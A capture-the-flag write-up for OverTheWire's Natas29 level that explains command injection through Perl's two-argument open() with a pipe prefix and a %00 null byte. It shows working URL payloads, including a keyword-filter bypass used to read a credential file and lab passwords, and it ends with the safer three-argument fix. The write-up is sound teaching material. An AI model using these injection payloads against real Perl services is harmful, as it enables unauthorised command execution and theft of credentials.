---
category: natas
title: Natas29 - Vulnerability of open() in Perl
---

website: http://natas29.natas.labs.overthewire.org/ (password: airooCaiseiyee8he8xongien9euhe8b)


In this challenge, a dropdown menu is provided. By selecting an option, a corresponding page is displayed.
In the URL, I saw "http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground", which means the CGI is written in Perl and a file name is provided into that Perl script.
That immediately reminds me of a command injection.
As a test drive, I typed in the URL "http://natas29.natas.labs.overthewire.org/index.pl?file=\|pwd%00".
That URL returns "/var/www/natas/natas29", which is a good sign.

In the above input, the `%00` is a URL encoding of ASCII value 0 (i.e., the terminator '\0' in many programming lanaguages).
When it appears in a URL, everything behind it will be dropped.
For example, "http://my.example.com/upload/?filename=test.php%00.txt" is equivalent to "http://my.example.com/upload/?filename=test.php". 
This is a popular trick to bypass file extensions for hackers. We will revisit it later.

Trying another parameter "?file=\|ls%00" returns a list of files in the directory, including the file "index.pl".


My next step is to dump the script "index.pl" by injecting the command `cat index.pl`.
To achieve the goal, I provided the parameter "?file=cat%20index.pl%00", where "%20" is a url encoding of space.
You can also use the character '+' to replace "%20" in a URL.
This command injection shows us the source code of "index.pl", part of which is given below:

```perl
#!/usr/bin/perl
...
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

To show natas30's password, you will need to inject the command "cat /etc/natas_webpass/natas30".
However, as shown above, the keyword "natas" is escaped,
so we cannot feed the parameter with "?file=|cat%20/etc/natas_webpass/natas30%00".
To workaround it, I fed "?file=|cat%20/etc/na\'\'tas_webpass/nat\'\'as30%00", which returned the password <small>wie9iexae0Daihohv8vuu3cei9wahf0e</small>.

<strong>How it works</strong>

The reason we can launch a command injection against this code is because of the `open()` function in Perl.
This function can be used for command execution by prefixing the filename with a pipe (i.e., "\|").
For example:
```plain
$ perl -e 'open($fd, "|pwd");'
/tmp
```

That's why we feed something like "?file=\|pwd" in the URL.
However, because the source code `open(FD, "$f.txt");` has a file extension ".txt",
it will try to execute the file "pwd.txt", which is impossible.
To bypass the file extension, we append "%00" at the end in the URL, i.e. "?file=\|pwd%00".
Remember the trick we mentioned earlier? "%00" is the url encoding of the terminator '\0'.
When a Perl script sees the terminator, it will ignore the rest part.
Let's look at an example:
```plain
$ perl -e 'open($fd, "|pwd.txt") || die "Failed";'
Failed at -e line 1.

$ perl -e 'open($fd, "|pwd\0.txt") || die "Failed";'
/tmp
```

The second execution succeeded because of the terminator '\0'.



<strong>CONCLUSION</strong>

This challenge covers a few vulnerabilities:

1. The `open()` function is vulnerable to command injection if not used correctly.
In fact, this function has different forms.
To prevent a command injection, a much safer way is to use the 3-parameter form (see an example below).


2. Once "%00" appears in a URL, it's equivalent to a null terminator. Everything behind it will be ignored.
This can be used to bypass file extension restricts.

```plain
    $ perl -e 'open($fd, "|pwd") or die "Failed"'
    /tmp

    $ perl -e 'open($fd, "<", "|pwd") or die "Failed"'
    Failed at -e line 1.
```

<strong>Reference</strong>
1. <a href="https://perldoc.perl.org/functions/open">Perl document: open</a>
2. <a href="https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html">open() for Command Execution</a>
